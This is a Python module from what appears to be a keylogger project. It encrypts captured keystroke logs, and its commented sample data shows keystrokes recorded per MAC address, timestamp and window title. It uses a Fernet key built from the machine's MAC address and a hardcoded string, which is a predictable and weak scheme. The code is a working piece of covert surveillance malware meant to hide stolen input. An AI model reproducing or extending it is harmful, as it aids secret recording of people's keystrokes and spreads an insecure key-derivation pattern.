import json
import base64
from cryptography.fernet import Fernet
from getmac import get_mac_address

# example
# example_dic={"f8:54:f6:bc:2e:64": {"12/02/2025  16:04": {"Desktop – KeyLogger_Manager.py": ["k", "j", "k", "j", "k", "j", "d", "k", "w", "j", "k", "j", "k"], "כרטיסייה חדשה - Google Chrome": ["h", "k", "h", "k", "d", "j", "k", "j", "k", "j", "d", "s", "j", "k", "j", "k", "s"], "Program Manager": ["shift", "Q"]}}}

class Encrypt:
    #create a key base on the mac address
    @staticmethod
    def create_key(mac_address):
        # for test option
        # ad="f8:54:f6:bc:2e:64"
        address=mac_address.replace(":","f")

        # address = get_mac_address().replace(":","f") #get mac address and replace ":" with "f"
        base_key = f"fp88{address}wAxDAAjijM=" #our key
        final_key=base64.urlsafe_b64encode(base_key.encode()) #convert to base64
        return final_key

    @staticmethod
    def encrypt_data(data, key):
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(json.dumps(data).encode())
        return encrypted_data

# Example
# key=create_key()
# encrypted_dic=encrypt_data(example_dic)
# print(json.dumps(str(encrypted_dic)))
# print(type(bytes(encrypted_dic)))



# if __name__ == "__main__":
    # print("🔑 key:",key)
    # print("🔒 encrypted data:",encrypted_dic)